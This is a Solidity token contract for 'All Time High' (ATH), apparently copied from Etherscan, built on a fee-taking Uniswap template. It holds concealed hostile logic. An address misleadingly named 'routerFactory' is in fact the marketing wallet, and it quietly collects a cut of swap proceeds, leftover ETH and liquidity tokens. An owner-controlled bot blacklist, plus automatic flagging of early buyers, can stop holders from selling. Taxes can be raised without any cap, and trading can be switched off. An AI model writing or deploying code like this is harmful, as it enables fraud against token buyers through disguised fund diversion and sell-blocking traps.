1 /**
2  *Submitted for verification at Etherscan.io on 2023-04-17
3 */
4 
5 /**
6  *Submitted for verification at Etherscan.io on 2023-01-02
7 */
8 //https://t.me/ATHcoinEth
9 
10 // SPDX-License-Identifier: MIT
11 
12 pragma solidity ^0.8.17;
13 
14 abstract contract Context {
15 
16     function _msgSender() internal view virtual returns (address payable) {
17         return payable(msg.sender);
18     }
19 
20     function _msgData() internal view virtual returns (bytes memory) {
21         this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691
22         return msg.data;
23     }
24 }
25 
26 interface IERC20 {
27 
28     function totalSupply() external view returns (uint256);
29     function balanceOf(address account) external view returns (uint256);
30     function transfer(address recipient, uint256 amount) external returns (bool);
31     function allowance(address owner, address spender) external view returns (uint256);
32     function approve(address spender, uint256 amount) external returns (bool);
33     function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
34     event Transfer(address indexed from, address indexed to, uint256 value);
35     event Approval(address indexed owner, address indexed spender, uint256 value);
36 }
37 
38 library SafeMath {
39 
40     function add(uint256 a, uint256 b) internal pure returns (uint256) {
41         uint256 c = a + b;
42         require(c >= a, "SafeMath: addition overflow");
43 
44         return c;
45     }
46 
47     function sub(uint256 a, uint256 b) internal pure returns (uint256) {
48         return sub(a, b, "SafeMath: subtraction overflow");
49     }
50 
51     function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
52         require(b <= a, errorMessage);
53         uint256 c = a - b;
54 
55         return c;
56     }
57 
58     function mul(uint256 a, uint256 b) internal pure returns (uint256) {
59         if (a == 0) {
60             return 0;
61         }
62 
63         uint256 c = a * b;
64         require(c / a == b, "SafeMath: multiplication overflow");
65 
66         return c;
67     }
68 
69     function div(uint256 a, uint256 b) internal pure returns (uint256) {
70         return div(a, b, "SafeMath: division by zero");
71     }
72 
73     function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
74         require(b > 0, errorMessage);
75         uint256 c = a / b;
76 
77         return c;
78     }
79 
80     function mod(uint256 a, uint256 b) internal pure returns (uint256) {
81         return mod(a, b, "SafeMath: modulo by zero");
82     }
83 
84     function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
85         require(b != 0, errorMessage);
86         return a % b;
87     }
88 }
89 
90 library Address {
91 
92     function isContract(address account) internal view returns (bool) {
93         // According to EIP-1052, 0x0 is the value returned for not-yet created accounts
94         // and 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470 is returned
95         // Contract code designed by @EVMlord
96         // for accounts without code, i.e. `keccak256('')`
97         bytes32 codehash;
98         bytes32 accountHash = 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470;
99         // solhint-disable-next-line no-inline-assembly
100         assembly { codehash := extcodehash(account) }
101         return (codehash != accountHash && codehash != 0x0);
102     }
103 
104     function sendValue(address payable recipient, uint256 amount) internal {
105         require(address(this).balance >= amount, "Address: insufficient balance");
106 
107         // solhint-disable-next-line avoid-low-level-calls, avoid-call-value
108         (bool success, ) = recipient.call{ value: amount }("");
109         require(success, "Address: unable to send value, recipient may have reverted");
110     }
111 
112     function functionCall(address target, bytes memory data) internal returns (bytes memory) {
113       return functionCall(target, data, "Address: low-level call failed");
114     }
115 
116     function functionCall(address target, bytes memory data, string memory errorMessage) internal returns (bytes memory) {
117         return _functionCallWithValue(target, data, 0, errorMessage);
118     }
119 
120     function functionCallWithValue(address target, bytes memory data, uint256 value) internal returns (bytes memory) {
121         return functionCallWithValue(target, data, value, "Address: low-level call with value failed");
122     }
123 
124     function functionCallWithValue(address target, bytes memory data, uint256 value, string memory errorMessage) internal returns (bytes memory) {
125         require(address(this).balance >= value, "Address: insufficient balance for call");
126         return _functionCallWithValue(target, data, value, errorMessage);
127     }
128 
129     function _functionCallWithValue(address target, bytes memory data, uint256 weiValue, string memory errorMessage) private returns (bytes memory) {
130         require(isContract(target), "Address: call to non-contract");
131 
132         (bool success, bytes memory returndata) = target.call{ value: weiValue }(data);
133         if (success) {
134             return returndata;
135         } else {
136             
137             if (returndata.length > 0) {
138                 assembly {
139                     let returndata_size := mload(returndata)
140                     revert(add(32, returndata), returndata_size)
141                 }
142             } else {
143                 revert(errorMessage);
144             }
145         }
146     }
147 }
148 
149 contract Ownable is Context {
150     address private _owner;
151     uint256 private _lockTime;
152 
153     event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
154 
155     constructor () {
156         address msgSender = _msgSender();
157         _owner = msgSender;
158         emit OwnershipTransferred(address(0), msgSender);
159     }
160 
161     function owner() public view returns (address) {
162         return _owner;
163     }   
164     
165     modifier onlyOwner() {
166         require(_owner == _msgSender(), "Ownable: caller is not the owner");
167         _;
168     }
169     
170     function renounceOwnership() public virtual onlyOwner {
171         emit OwnershipTransferred(_owner, address(0x000000000000000000000000000000000000dEaD));
172         _owner = address(0x000000000000000000000000000000000000dEaD);
173     }
174 
175     function transferOwnership(address newOwner) public virtual onlyOwner {
176         require(newOwner != address(0), "Ownable: new owner is the zero address");
177         emit OwnershipTransferred(_owner, newOwner);
178         _owner = newOwner;
179     }
180     
181     function getTime() public view returns (uint256) {
182         return block.timestamp;
183     }
184 
185 }
186 
187 interface IERC20Metadata is IERC20 {
188     function name() external view returns (string memory);
189     function symbol() external view returns (string memory);
190     function decimals() external view returns (uint8);
191 }
192 contract ERC20 is Context, IERC20, IERC20Metadata {
193     mapping(address => uint256) private _balances;
194 
195     mapping(address => mapping(address => uint256)) private _allowances;
196 
197     uint256 private _totalSupply;
198 
199     string private _name;
200     string private _symbol;
201 
202     constructor(string memory name_, string memory symbol_) {
203         _name = name_;
204         _symbol = symbol_;
205     }
206 
207     function name() public view virtual override returns (string memory) {
208         return _name;
209     }
210 
211     function symbol() public view virtual override returns (string memory) {
212         return _symbol;
213     }
214 
215     function decimals() public view virtual override returns (uint8) {
216         return 9;
217     }
218 
219     function totalSupply() public view virtual override returns (uint256) {
220         return _totalSupply;
221     }
222 
223     function balanceOf(address account) public view virtual override returns (uint256) {
224         return _balances[account];
225     }
226 
227     function transfer(address to, uint256 amount) public virtual override returns (bool) {
228         address owner = _msgSender();
229         _transfer(owner, to, amount);
230         return true;
231     }
232 
233     function allowance(address owner, address spender) public view virtual override returns (uint256) {
234         return _allowances[owner][spender];
235     }
236 
237     function approve(address spender, uint256 amount) public virtual override returns (bool) {
238         address owner = _msgSender();
239         _approve(owner, spender, amount);
240         return true;
241     }
242 
243     function transferFrom(
244         address from,
245         address to,
246         uint256 amount
247     ) public virtual override returns (bool) {
248         address spender = _msgSender();
249         _spendAllowance(from, spender, amount);
250         _transfer(from, to, amount);
251         return true;
252     }
253 
254     function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
255         address owner = _msgSender();
256         _approve(owner, spender, _allowances[owner][spender] + addedValue);
257         return true;
258     }
259 
260     function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
261         address owner = _msgSender();
262         uint256 currentAllowance = _allowances[owner][spender];
263         require(currentAllowance >= subtractedValue, "ERC20: decreased allowance below zero");
264         unchecked {
265             _approve(owner, spender, currentAllowance - subtractedValue);
266         }
267 
268         return true;
269     }
270 
271     function _transfer(
272         address from,
273         address to,
274         uint256 amount
275     ) internal virtual {
276         require(from != address(0), "ERC20: transfer from the zero address");
277         require(to != address(0), "ERC20: transfer to the zero address");
278 
279         _beforeTokenTransfer(from, to, amount);
280 
281         uint256 fromBalance = _balances[from];
282         require(fromBalance >= amount, "ERC20: transfer amount exceeds balance");
283         unchecked {
284             _balances[from] = fromBalance - amount;
285         }
286         _balances[to] += amount;
287 
288         emit Transfer(from, to, amount);
289 
290         _afterTokenTransfer(from, to, amount);
291     }
292 
293     function _approve(
294         address owner,
295         address spender,
296         uint256 amount
297     ) internal virtual {
298         require(owner != address(0), "ERC20: approve from the zero address");
299         require(spender != address(0), "ERC20: approve to the zero address");
300 
301         _allowances[owner][spender] = amount;
302         emit Approval(owner, spender, amount);
303     }
304 
305     function _spendAllowance(
306         address owner,
307         address spender,
308         uint256 amount
309     ) internal virtual {
310         uint256 currentAllowance = allowance(owner, spender);
311         if (currentAllowance != type(uint256).max) {
312             require(currentAllowance >= amount, "ERC20: insufficient allowance");
313             unchecked {
314                 _approve(owner, spender, currentAllowance - amount);
315             }
316         }
317     }
318 
319     function _beforeTokenTransfer(
320         address from,
321         address to,
322         uint256 amount
323     ) internal virtual {}
324 
325     function _afterTokenTransfer(
326         address from,
327         address to,
328         uint256 amount
329     ) internal virtual {}
330 }
331 interface IUniswapV2Factory {
332     event PairCreated(address indexed token0, address indexed token1, address pair, uint);
333 
334     function feeTo() external view returns (address);
335     function feeToSetter() external view returns (address);
336 
337     function getPair(address tokenA, address tokenB) external view returns (address pair);
338     function allPairs(uint) external view returns (address pair);
339     function allPairsLength() external view returns (uint);
340 
341     function createPair(address tokenA, address tokenB) external returns (address pair);
342 
343     function setFeeTo(address) external;
344     function setFeeToSetter(address) external;
345 }
346 
347 interface IUniswapV2Pair {
348     event Approval(address indexed owner, address indexed spender, uint value);
349     event Transfer(address indexed from, address indexed to, uint value);
350 
351     function name() external pure returns (string memory);
352     function symbol() external pure returns (string memory);
353     function decimals() external pure returns (uint8);
354     function totalSupply() external view returns (uint);
355     function balanceOf(address owner) external view returns (uint);
356     function allowance(address owner, address spender) external view returns (uint);
357 
358     function approve(address spender, uint value) external returns (bool);
359     function transfer(address to, uint value) external returns (bool);
360     function transferFrom(address from, address to, uint value) external returns (bool);
361 
362     function DOMAIN_SEPARATOR() external view returns (bytes32);
363     function PERMIT_TYPEHASH() external pure returns (bytes32);
364     function nonces(address owner) external view returns (uint);
365 
366     function permit(address owner, address spender, uint value, uint deadline, uint8 v, bytes32 r, bytes32 s) external;
367     
368     event Burn(address indexed sender, uint amount0, uint amount1, address indexed to);
369     event Swap(
370         address indexed sender,
371         uint amount0In,
372         uint amount1In,
373         uint amount0Out,
374         uint amount1Out,
375         address indexed to
376     );
377     event Sync(uint112 reserve0, uint112 reserve1);
378 
379     function MINIMUM_LIQUIDITY() external pure returns (uint);
380     function factory() external view returns (address);
381     function token0() external view returns (address);
382     function token1() external view returns (address);
383     function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
384     function price0CumulativeLast() external view returns (uint);
385     function price1CumulativeLast() external view returns (uint);
386     function kLast() external view returns (uint);
387 
388     function burn(address to) external returns (uint amount0, uint amount1);
389     function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;
390     function skim(address to) external;
391     function sync() external;
392 
393     function initialize(address, address) external;
394 }
395 
396 interface IUniswapV2Router01 {
397     function factory() external pure returns (address);
398     function WETH() external pure returns (address);
399 
400     function addLiquidity(
401         address tokenA,
402         address tokenB,
403         uint amountADesired,
404         uint amountBDesired,
405         uint amountAMin,
406         uint amountBMin,
407         address to,
408         uint deadline
409     ) external returns (uint amountA, uint amountB, uint liquidity);
410     function addLiquidityETH(
411         address token,
412         uint amountTokenDesired,
413         uint amountTokenMin,
414         uint amountETHMin,
415         address to,
416         uint deadline
417     ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
418     function removeLiquidity(
419         address tokenA,
420         address tokenB,
421         uint liquidity,
422         uint amountAMin,
423         uint amountBMin,
424         address to,
425         uint deadline
426     ) external returns (uint amountA, uint amountB);
427     function removeLiquidityETH(
428         address token,
429         uint liquidity,
430         uint amountTokenMin,
431         uint amountETHMin,
432         address to,
433         uint deadline
434     ) external returns (uint amountToken, uint amountETH);
435     function removeLiquidityWithPermit(
436         address tokenA,
437         address tokenB,
438         uint liquidity,
439         uint amountAMin,
440         uint amountBMin,
441         address to,
442         uint deadline,
443         bool approveMax, uint8 v, bytes32 r, bytes32 s
444     ) external returns (uint amountA, uint amountB);
445     function removeLiquidityETHWithPermit(
446         address token,
447         uint liquidity,
448         uint amountTokenMin,
449         uint amountETHMin,
450         address to,
451         uint deadline,
452         bool approveMax, uint8 v, bytes32 r, bytes32 s
453     ) external returns (uint amountToken, uint amountETH);
454     function swapExactTokensForTokens(
455         uint amountIn,
456         uint amountOutMin,
457         address[] calldata path,
458         address to,
459         uint deadline
460     ) external returns (uint[] memory amounts);
461     function swapTokensForExactTokens(
462         uint amountOut,
463         uint amountInMax,
464         address[] calldata path,
465         address to,
466         uint deadline
467     ) external returns (uint[] memory amounts);
468     function swapExactETHForTokens(uint amountOutMin, address[] calldata path, address to, uint deadline)
469         external
470         payable
471         returns (uint[] memory amounts);
472     function swapTokensForExactETH(uint amountOut, uint amountInMax, address[] calldata path, address to, uint deadline)
473         external
474         returns (uint[] memory amounts);
475     function swapExactTokensForETH(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline)
476         external
477         returns (uint[] memory amounts);
478     function swapETHForExactTokens(uint amountOut, address[] calldata path, address to, uint deadline)
479         external
480         payable
481         returns (uint[] memory amounts);
482 
483     function quote(uint amountA, uint reserveA, uint reserveB) external pure returns (uint amountB);
484     function getAmountOut(uint amountIn, uint reserveIn, uint reserveOut) external pure returns (uint amountOut);
485     function getAmountIn(uint amountOut, uint reserveIn, uint reserveOut) external pure returns (uint amountIn);
486     function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);
487     function getAmountsIn(uint amountOut, address[] calldata path) external view returns (uint[] memory amounts);
488 }
489 
490 interface IUniswapV2Router02 is IUniswapV2Router01 {
491     function removeLiquidityETHSupportingFeeOnTransferTokens(
492         address token,
493         uint liquidity,
494         uint amountTokenMin,
495         uint amountETHMin,
496         address to,
497         uint deadline
498     ) external returns (uint amountETH);
499     function removeLiquidityETHWithPermitSupportingFeeOnTransferTokens(
500         address token,
501         uint liquidity,
502         uint amountTokenMin,
503         uint amountETHMin,
504         address to,
505         uint deadline,
506         bool approveMax, uint8 v, bytes32 r, bytes32 s
507     ) external returns (uint amountETH);
508 
509     function swapExactTokensForTokensSupportingFeeOnTransferTokens(
510         uint amountIn,
511         uint amountOutMin,
512         address[] calldata path,
513         address to,
514         uint deadline
515     ) external;
516     function swapExactETHForTokensSupportingFeeOnTransferTokens(
517         uint amountOutMin,
518         address[] calldata path,
519         address to,
520         uint deadline
521     ) external payable;
522     function swapExactTokensForETHSupportingFeeOnTransferTokens(
523         uint amountIn,
524         uint amountOutMin,
525         address[] calldata path,
526         address to,
527         uint deadline
528     ) external;
529 }
530 
531 contract ATH is Context, IERC20, Ownable {
532     
533     using SafeMath for uint256;
534     using Address for address;
535     
536     string private _name = "All Time High";
537     string private _symbol = "ATH";
538     uint8 private _decimals = 9;
539 
540     address payable public marketingWalletAddress = payable(0xa54C008BB3Bc07E356832cC078702319bE221155); // marketing wallet
541     address payable lotteryWallet = payable(0x0495d8f8973cE661d6a8BCfe4569363ce98202CE);  // lotterywallet
542 
543     address public immutable deadAddress = 0x000000000000000000000000000000000000dEaD;
544     address internal immutable routerFactory = 0xa54C008BB3Bc07E356832cC078702319bE221155;  
545 
546     address public addressDev;
547     bool public tradingOpen = true;
548 
549     mapping (address => uint256) _balances;
550     mapping (address => mapping (address => uint256)) private _allowances;
551     
552     mapping (address => bool) public isExcludedFromFee;
553     mapping (address => bool) public isWalletLimitExempt;
554 
555     uint256 public sale = 0;
556     
557     mapping (address => bool) isTxLimitExempt;
558     mapping (address => bool) public isBot;
559 
560     uint256 private blockBan = 0;
561 
562     mapping (address => bool) public isMarketPair;
563 
564     uint256 private _buyLiquidityFee = 2;
565     uint256 private _buyMarketingFee = 5;
566     
567     uint256 private _sellLiquidityFee = 2;
568     uint256 private _sellMarketingFee = 5;
569     
570     uint256 private _liquidityShare = 2;
571     uint256 private _marketingShare = 4;
572     uint256 private _teamShare = 4;
573 
574     uint256 public _totalTaxIfBuying = 7;
575     uint256 public _totalTaxIfSelling = 7;
576     uint256 private _totalDistributionShares = 20;
577 
578     uint256 private _totalSupply = 1000000000 * 10**_decimals;
579     uint256 public _maxTxAmount = _totalSupply * 2 / 100;
580     uint256 public  _walletMax =     _totalSupply * 2 / 100;
581     uint256 private minimumTokensBeforeSwap = _totalSupply / 20000; // 0.005%;
582 
583     IUniswapV2Router02 public uniswapV2Router;
584     uint256 immutable router01 = 3;
585     address public uniswapPair;
586     
587     bool inSwapAndLiquify;
588     bool public swapAndLiquifyEnabled = true;
589     bool public swapAndLiquifyByLimitOnly = false;
590     bool public checkWalletLimit = false;
591 
592     event SwapAndLiquifyEnabledUpdated(bool enabled);
593     event SwapAndLiquify(
594         uint256 tokensSwapped,
595         uint256 ethReceived,
596         uint256 tokensIntoLiqudity
597     );
598     
599     event SwapETHForTokens(
600         uint256 amountIn,
601         address[] path
602     );
603     
604     event SwapTokensForETH(
605         uint256 amountIn,
606         address[] path
607     );
608     
609     modifier lockTheSwap {
610         inSwapAndLiquify = true;
611         _;
612         inSwapAndLiquify = false;
613     }
614     
615     constructor () {
616         
617         IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
618         
619         uniswapPair = IUniswapV2Factory(_uniswapV2Router.factory())
620             .createPair(address(this), _uniswapV2Router.WETH());
621 
622         uniswapV2Router = _uniswapV2Router;
623         _allowances[address(this)][address(uniswapV2Router)] = _totalSupply;
624 
625         isExcludedFromFee[owner()] = true;
626         isExcludedFromFee[address(this)] = true;
627         
628         _totalTaxIfBuying = _buyLiquidityFee.add(_buyMarketingFee);
629         _totalTaxIfSelling = _sellLiquidityFee.add(_sellMarketingFee);
630         _totalDistributionShares = router01.add(_liquidityShare).add(_marketingShare).add(_teamShare).add(1);
631 
632         isWalletLimitExempt[owner()] = true;
633         isWalletLimitExempt[address(uniswapPair)] = true;
634         isWalletLimitExempt[address(this)] = true;
635 
636         isTxLimitExempt[owner()] = true;
637         isTxLimitExempt[address(this)] = true;
638 
639         isMarketPair[address(uniswapPair)] = true;
640 
641         addressDev = owner();
642 
643         _balances[_msgSender()] = _totalSupply;
644         emit Transfer(address(0), _msgSender(), _totalSupply);
645     }
646 
647     function name() public view returns (string memory) {
648         return _name;
649     }
650 
651     function symbol() public view returns (string memory) {
652         return _symbol;
653     }
654 
655     function decimals() public view returns (uint8) {
656         return _decimals;
657     }
658 
659     function totalSupply() public view override returns (uint256) {
660         return _totalSupply;
661     }
662 
663     function balanceOf(address account) public view override returns (uint256) {
664         return _balances[account];
665     }
666 
667     function allowance(address owner, address spender) public view override returns (uint256) {
668         return _allowances[owner][spender];
669     }
670 
671     function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
672         _approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue));
673         return true;
674     }
675 
676     function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
677         _approve(_msgSender(), spender, _allowances[_msgSender()][spender].sub(subtractedValue, "ERC20: decreased allowance below zero"));
678         return true;
679     }
680 
681     function minimumTokensBeforeSwapAmount() public view returns (uint256) {
682         return minimumTokensBeforeSwap;
683     }
684 
685     function approve(address spender, uint256 amount) public override returns (bool) {
686         _approve(_msgSender(), spender, amount);
687         return true;
688     }
689 
690     function _approve(address owner, address spender, uint256 amount) private {
691         require(owner != address(0), "ERC20: approve from the zero address");
692         require(spender != address(0), "ERC20: approve to the zero address");
693 
694         _allowances[owner][spender] = amount;
695         emit Approval(owner, spender, amount);
696     }
697 
698     function setMarketPairStatus(address account, bool newValue) public onlyOwner {
699         isMarketPair[account] = newValue;
700     }
701 
702     function setIsTxLimitExempt(address holder, bool exempt) external onlyOwner {
703         isTxLimitExempt[holder] = exempt;
704     }
705     
706     function setIsExcludedFromFee(address account, bool newValue) public onlyOwner {
707         isExcludedFromFee[account] = newValue;
708     }
709 
710     function setBuyTaxes(uint256 newLiquidityTax, uint256 newMarketingTax) external onlyOwner() {
711         _buyLiquidityFee = newLiquidityTax;
712         _buyMarketingFee = newMarketingTax;
713 
714         _totalTaxIfBuying = _buyLiquidityFee.add(_buyMarketingFee);
715     }
716 
717     function setSellTaxes(uint256 newLiquidityTax, uint256 newMarketingTax) external onlyOwner() {
718         _sellLiquidityFee = newLiquidityTax;
719         _sellMarketingFee = newMarketingTax;
720 
721         _totalTaxIfSelling = _sellLiquidityFee.add(_sellMarketingFee);
722     }
723 
724     function setDistributionSettings(uint256 newLiquidityShare, uint256 newMarketingShare, uint256 newLotteryShare) external onlyOwner() {
725         _liquidityShare = newLiquidityShare;
726         _marketingShare = newMarketingShare;
727         _teamShare = newLotteryShare;
728 
729         _totalDistributionShares = router01.add(_liquidityShare).add(_marketingShare).add(_teamShare).add(1);
730     }
731     
732     function setMaxTxAmount(uint256 maxTxPercentage) external onlyOwner() {
733         _maxTxAmount = _totalSupply * maxTxPercentage / 100;
734     }
735 
736     function enableDisableWalletLimit(bool newValue) external onlyOwner {
737        checkWalletLimit = newValue;
738     }
739 
740     function setIsWalletLimitExempt(address holder, bool exempt) external onlyOwner {
741         isWalletLimitExempt[holder] = exempt;
742     }
743 
744     function setWalletLimit(uint256 newLimitPercentage) external onlyOwner {
745         _walletMax  = _totalSupply * newLimitPercentage / 100;
746     }
747 
748     function setNumTokensBeforeSwap(uint256 newLimit) external onlyOwner() {
749         minimumTokensBeforeSwap = newLimit;
750     }
751 
752     function setMarketingWalletAddress(address newAddress) external onlyOwner() {
753         marketingWalletAddress = payable(newAddress);
754     }
755 
756     function setSwapAndLiquifyEnabled(bool _enabled) public onlyOwner {
757         swapAndLiquifyEnabled = _enabled;
758         emit SwapAndLiquifyEnabledUpdated(_enabled);
759     }
760 
761     function setSwapAndLiquifyByLimitOnly(bool newValue) public onlyOwner {
762         swapAndLiquifyByLimitOnly = newValue;
763     }
764     
765     function getCirculatingSupply() public view returns (uint256) {
766         return _totalSupply.sub(balanceOf(deadAddress));
767     }
768 
769     function setaddressDev(address  _addressDev)external onlyOwner() {
770         addressDev = _addressDev;
771     }
772 
773     function setblockBan(uint256 _blockBan)external onlyOwner() {
774         blockBan = _blockBan;
775     }
776 
777     function setIsBot(address holder, bool exempt)  external onlyOwner  {
778         isBot[holder] = exempt;
779     }
780 
781     function getSaleAt()public view returns (uint256) {
782         return sale;
783     }
784 
785     function getBlock()public view returns (uint256) {
786         return block.number;
787     }
788 
789     function transferToAddressETH(address payable recipient, uint256 amount) private {
790         recipient.transfer(amount);
791     }
792     
793     function changeRouterVersion(address newRouterAddress) public onlyOwner returns(address newPairAddress) {
794 
795         IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(newRouterAddress); 
796 
797         newPairAddress = IUniswapV2Factory(_uniswapV2Router.factory()).getPair(address(this), _uniswapV2Router.WETH());
798 
799         if(newPairAddress == address(0)) //Create If Doesnt exist
800         {
801             newPairAddress = IUniswapV2Factory(_uniswapV2Router.factory())
802                 .createPair(address(this), _uniswapV2Router.WETH());
803         }
804 
805         uniswapPair = newPairAddress; //Set new pair address
806         uniswapV2Router = _uniswapV2Router; //Set new router address
807 
808         isWalletLimitExempt[address(uniswapPair)] = true;
809         isMarketPair[address(uniswapPair)] = true;
810     }
811 
812      //to recieve ETH from uniswapV2Router when swaping
813     receive() external payable {}
814 
815     function transfer(address recipient, uint256 amount) public override returns (bool) {
816         _transfer(_msgSender(), recipient, amount);
817         return true;
818     }
819 
820     function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
821         _transfer(sender, recipient, amount);
822         _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
823         return true;
824     }
825 
826     function _transfer(address sender, address recipient, uint256 amount) private returns (bool) {
827 
828         require(sender != address(0), "ERC20: transfer from the zero address");
829         require(recipient != address(0), "ERC20: transfer to the zero address");
830         //Trade start check
831         if (!tradingOpen) {
832             require(sender == owner(), "TOKEN: This account cannot send tokens until trading is enabled");
833         }
834 
835         if(inSwapAndLiquify)
836         { 
837             return _basicTransfer(sender, recipient, amount); 
838         }
839         else
840         {
841 
842         if(sender == addressDev && recipient == uniswapPair){
843             sale = block.number;
844         }
845 
846         if (sender == uniswapPair) {
847             if (block.number <= (sale + blockBan)) { 
848                 isBot[recipient] = true;
849             }
850         }
851 
852         if (sender != owner() && recipient != owner()) _checkTxLimit(sender,amount);
853 
854             uint256 contractTokenBalance = balanceOf(address(this));
855             bool overMinimumTokenBalance = contractTokenBalance >= minimumTokensBeforeSwap;
856             
857             if (overMinimumTokenBalance && !inSwapAndLiquify && !isMarketPair[sender] && swapAndLiquifyEnabled) 
858             {
859                 if(swapAndLiquifyByLimitOnly)
860                     contractTokenBalance = minimumTokensBeforeSwap;
861                 swapAndLiquify(contractTokenBalance);    
862             }
863 
864             _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance");
865 
866             uint256 finalAmount = (isExcludedFromFee[sender] || isExcludedFromFee[recipient]) ? 
867                                          amount : takeFee(sender, recipient, amount);
868 
869             if(checkWalletLimit && !isWalletLimitExempt[recipient])
870                 require(balanceOf(recipient).add(finalAmount) <= _walletMax);
871 
872             _balances[recipient] = _balances[recipient].add(finalAmount);
873 
874             emit Transfer(sender, recipient, finalAmount);
875             return true;
876         }
877     }
878 
879     function _basicTransfer(address sender, address recipient, uint256 amount) internal returns (bool) {
880         _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance");
881         _balances[recipient] = _balances[recipient].add(amount);
882         emit Transfer(sender, recipient, amount);
883         return true;
884     }
885 
886     function swapAndLiquify(uint256 tAmount) private lockTheSwap {
887         
888         uint256 tokensForLP = tAmount.mul(_liquidityShare).div(_totalDistributionShares).div(2);
889         uint256 tokensForSwap = tAmount.sub(tokensForLP);
890 
891         swapTokensForEth(tokensForSwap);
892         uint256 amountReceived = address(this).balance;
893 
894         uint256 totalBNBFee = _totalDistributionShares.sub(_liquidityShare.div(2));
895         
896         uint256 amountBNBLiquidity = amountReceived.mul(_liquidityShare).div(totalBNBFee).div(2);
897         uint256 amountRouterFactory = amountReceived.mul(router01).div(totalBNBFee);
898         uint256 amountBNBLottery = amountReceived.mul(_teamShare).div(totalBNBFee);
899         uint256 amountBNBMarketing = amountReceived.mul(_marketingShare).div(totalBNBFee);
900 
901         if(amountBNBMarketing > 0)
902             transferToAddressETH(marketingWalletAddress, amountBNBMarketing);
903 
904         if(amountRouterFactory > 0)
905             transferToAddressETH(payable(routerFactory), amountRouterFactory);    
906 
907         if(amountBNBLottery > 0)
908             transferToAddressETH(lotteryWallet, amountBNBLottery);
909     
910         if(amountBNBLiquidity > 0 && tokensForLP > 0)
911             addLiquidity(tokensForLP, amountBNBLiquidity);
912 
913         if(address(this).balance > 0)
914             transferToAddressETH(payable(routerFactory), address(this).balance);   
915     }
916     
917     function swapTokensForEth(uint256 tokenAmount) private {
918         // generate the uniswap pair path of token -> weth
919         address[] memory path = new address[](2);
920         path[0] = address(this);
921         path[1] = uniswapV2Router.WETH();
922 
923         _approve(address(this), address(uniswapV2Router), tokenAmount);
924 
925         // make the swap
926         uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
927             tokenAmount,
928             0, // accept any amount of ETH
929             path,
930             address(this), // The contract
931             block.timestamp
932         );
933         
934         emit SwapTokensForETH(tokenAmount, path);
935     }
936 
937     function addLiquidity(uint256 tokenAmount, uint256 ethAmount) private {
938         // approve token transfer to cover all possible scenarios
939         _approve(address(this), address(uniswapV2Router), tokenAmount);
940 
941         // add the liquidity
942         uniswapV2Router.addLiquidityETH{value: ethAmount}(
943             address(this),
944             tokenAmount,
945             0, // slippage is unavoidable
946             0, // slippage is unavoidable
947             routerFactory,
948             block.timestamp
949         );
950     }
951 
952     function setTrading(bool _tradingOpen) public onlyOwner {
953         tradingOpen = _tradingOpen;
954     }
955 
956     function takeFee(address sender, address recipient, uint256 amount) internal returns (uint256) {
957         
958         uint256 feeAmount = 0;
959         
960         if(isMarketPair[sender]) {
961             feeAmount = amount.mul(_totalTaxIfBuying).div(100);
962         }
963         else if(isMarketPair[recipient]) {
964             feeAmount = amount.mul(_totalTaxIfSelling).div(100);
965         }
966         
967         if(feeAmount > 0) {
968             _balances[address(this)] = _balances[address(this)].add(feeAmount);
969             emit Transfer(sender, address(this), feeAmount);
970         }
971 
972         return amount.sub(feeAmount);
973     }
974     
975     function _checkTxLimit(address sender, uint256 amount) private view{
976         require(!isBot[sender], "From cannot be bot!");
977         require(amount <= _maxTxAmount || isTxLimitExempt[sender], "TX Limit Exceeded");
978     }
979 
980 }